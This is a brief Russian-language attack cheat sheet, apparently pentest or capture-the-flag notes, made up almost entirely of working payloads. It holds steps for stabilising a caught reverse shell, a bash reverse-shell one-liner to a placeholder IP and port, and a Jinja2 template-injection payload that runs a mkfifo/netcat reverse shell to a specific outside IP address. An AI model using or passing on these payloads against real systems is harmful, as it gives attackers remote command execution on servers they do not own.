хороша стабилизация после установки реверсшела: 
```shell
# Нажми CTRL+Z, чтобы приостановить shell
stty raw -echo; fg
# нажми Enter
#потом надо использовать либо
script /dev/null -c bash
#либо
python3 -c 'import pty; pty.spawn("/bin/bash")'#перебор версий питон тоже норм
```
---
from Bash
```shell
bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
```
---
for jinja2
```http
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.11.147.65 9000 > /tmp/f').read() }}
```
---
